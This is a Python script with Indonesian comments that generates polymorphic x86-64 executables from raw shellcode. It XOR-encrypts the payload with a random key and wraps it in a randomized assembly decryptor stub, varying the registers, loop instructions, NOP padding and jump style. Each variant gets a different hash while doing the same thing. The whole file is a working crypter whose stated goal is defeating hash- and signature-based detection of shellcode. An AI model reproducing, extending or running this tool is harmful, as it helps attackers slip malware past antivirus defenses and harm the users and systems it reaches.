#!/usr/bin/env python3
"""
morph.py — generator polymorphic binary (stub assembly x86-64)

Cara kerja:
  1. Baca payload (raw shellcode, mis. hasil Makefile -> payload.bin).
  2. Generate key stream acak sepanjang payload; enkripsi payload (XOR).
  3. Generate stub assembly dengan VARIAN acak:
       - register berbeda untuk src/key/counter
       - body dekripsi: byte-wise (2 mem operand) / qword / xor-langsung-ke-mem
       - arah & instruksi counter berbeda (dec/jnz, sub/jne, add -1/jne)
       - NOP sled acak (nop, xchg %ax,%ax, nopw, lea 0(reg),reg)
       - instruksi init & jump berbeda (lea rip-rel / mov imm / push-ret)
     Key stream & ciphertext berbeda tiap run.
  4. Assemble (as) + link (ld -nostdlib) -> ELF executable varian.

Hasil: tiap run menghasilkan binary dengan sha256 BERBEDA, tetapi fungsi
identik (payload sama setelah didekripsi di memori oleh stub).
"""

import argparse
import random
import subprocess
import sys
import tempfile
import os
import hashlib

# Register 64-bit untuk src/key/counter — %rax sengaja TIDAK dipakai supaya
# %al / %rax bebas sebagai register kerja (tmp) di body dekripsi.
REG_POOL = ["%rbx", "%rcx", "%rdx", "%rsi", "%rdi", "%r8", "%r9", "%r10", "%r11"]

NOP_POOL = [
    "nop",
    "xchg %ax,%ax",
    "movq %r10,%r10",
]

INIT_SRC = [
    "leaq enc(%rip), {src}",
    "movq $enc, {src}",
]
INIT_KEY = [
    "leaq key(%rip), {key}",
    "movq $key, {key}",
]

BODY_BYTE = [
    # dua operand memori, tmp di %al
    "movb ({src}), %al\n        xorb ({key}), %al\n        movb %al, ({src})",
    "movb ({key}), %al\n        xorb %al, ({src})",
]
BODY_QWORD = [
    "movq ({src}), %rax\n        xorq ({key}), %rax\n        movq %rax, ({src})",
]

DECR_LOOP = [
    "decq {cnt}\n        jnz LOOP",
    "subq $1, {cnt}\n        jne LOOP",
    "addq $-1, {cnt}\n        jne LOOP",
    "decq {cnt}\n        jne LOOP",
]

JUMP_ENC = [
    "leaq enc(%rip), %rax\n        jmp *%rax",
    "movq $enc, %rax\n        jmp *%rax",
    "leaq enc(%rip), %rax\n        pushq %rax\n        ret",
]


def gen_nop_sled(rng, depth=0):
    n = rng.randint(1, 4)
    return "\n        ".join(rng.choice(NOP_POOL) for _ in range(n))


def build_stub(rng, enc_bytes, key_bytes, qword):
    src, key, cnt = rng.sample(REG_POOL, 3)
    body_style = rng.choice(["byte", "byte", "qword"])  # byte lebih sering
    if qword:
        body_style = "qword"
    body = rng.choice(BODY_QWORD if body_style == "qword" else BODY_BYTE)
    decr = rng.choice(DECR_LOOP).format(cnt=cnt)
    jmp = rng.choice(JUMP_ENC)
    init_src = rng.choice(INIT_SRC).format(src=src)
    init_key = rng.choice(INIT_KEY).format(key=key)

    if body_style == "qword":
        n_iter = len(enc_bytes) // 8
        step = "addq $8, {src}\n        addq $8, {key}".format(src=src, key=key)
        cnt_init = "movq ${n}, {cnt}".format(n=n_iter, cnt=cnt)
    else:
        n_iter = len(enc_bytes)
        step = "incq {src}\n        incq {key}".format(src=src, key=key)
        cnt_init = "movq ${n}, {cnt}".format(n=n_iter, cnt=cnt)

    body_full = body.format(src=src, key=key) + "\n        " + step

    # sisipkan NOP sled di beberapa titik
    pre_loop = gen_nop_sled(rng)
    mid_loop = gen_nop_sled(rng)

    enc_lines = ", ".join("0x%02x" % b for b in enc_bytes)
    key_lines = ", ".join("0x%02x" % b for b in key_bytes)

    return f"""# polymorphic stub — varian acak (jangan commit, regenerasi tiap run)
# section custom "awx" = writable + executable (payload didekripsi di tempat)
.section .morph, "awx"
.globl _start
_start:
        # init (varian)
        {init_src}
        {init_key}
        {cnt_init}
        # nop sled (varian)
        {pre_loop}
LOOP:
        # body dekripsi (varian)
        {body_full}
        # nop sled kecil (varian)
        {mid_loop}
        # counter & branch (varian)
        {decr}
        # lompat ke payload terdekripsi (varian)
        {jmp}
enc:
        .byte {enc_lines}
key:
        .byte {key_lines}
"""


def main():
    ap = argparse.ArgumentParser(description="Polymorphic binary generator")
    ap.add_argument("-p", "--payload", required=True, help="raw shellcode payload")
    ap.add_argument("-n", "--variants", type=int, default=5)
    ap.add_argument("-o", "--out", default="variant", help="prefix output")
    ap.add_argument("-s", "--seed", type=int, default=None, help="seed acak (repro)")
    args = ap.parse_args()

    payload = open(args.payload, "rb").read()
    if not payload:
        sys.exit("payload kosong")

    # padding ke kelipatan 8 (biar body qword bisa dipakai kapan saja)
    if len(payload) % 8:
        payload += b"\x90" * (8 - len(payload) % 8)

    rng = random.Random(args.seed)

    hashes = []
    for i in range(1, args.variants + 1):
        key = bytes(rng.randrange(256) for _ in range(len(payload)))
        enc = bytes(p ^ k for p, k in zip(payload, key))
        stub = build_stub(rng, enc, key, qword=(len(payload) % 8 == 0))

        out_path = f"{args.out}_{i}"
        with tempfile.TemporaryDirectory() as td:
            asm = os.path.join(td, "s.s")
            obj = os.path.join(td, "s.o")
            with open(asm, "w") as f:
                f.write(stub)
            try:
                subprocess.run(["as", asm, "-o", obj], check=True)
            except subprocess.CalledProcessError:
                # simpan stub yang gagal untuk debug
                with open("morph_debug.s", "w") as f:
                    f.write(stub)
                print(f"stub gagal disimpan ke morph_debug.s (variant {i})")
                raise
            subprocess.run(
                ["ld", "-nostdlib", "-o", out_path, obj], check=True
            )

        h = hashlib.sha256(open(out_path, "rb").read()).hexdigest()
        hashes.append(h)
        print(f"variant {i}: {out_path}  sha256={h[:16]}...  (body={ 'qword' if len(payload)%8==0 and 'qword' in stub else 'byte' })")

    uniq = len(set(hashes))
    print(f"\n{len(hashes)} varian, {uniq} hash unik")
    if uniq < len(hashes):
        print("PERINGATAN: ada hash yang sama (seharusnya semua beda)")


if __name__ == "__main__":
    main()
